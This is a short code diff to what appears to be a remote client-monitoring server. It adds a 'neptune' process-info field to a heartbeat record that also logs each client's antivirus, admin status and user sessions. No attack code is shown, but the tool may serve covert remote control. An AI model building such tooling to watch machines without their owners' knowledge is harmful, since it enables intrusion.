@@ -47,7 +47,8 @@ def heartbeat():
             "user_sessions": system_info.get('user_sessions', []),
             "has_password": system_info.get('has_password', False),
             "current_background_image": system_info.get('current_background_image', None),
-            "taskbar_hidden": system_info.get('taskbar_hidden', False)
+            "taskbar_hidden": system_info.get('taskbar_hidden', False),
+            "neptune": system_info.get('neptune', None) # Pass through Neptune process info
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
         if system_info.get('current_background_image'):
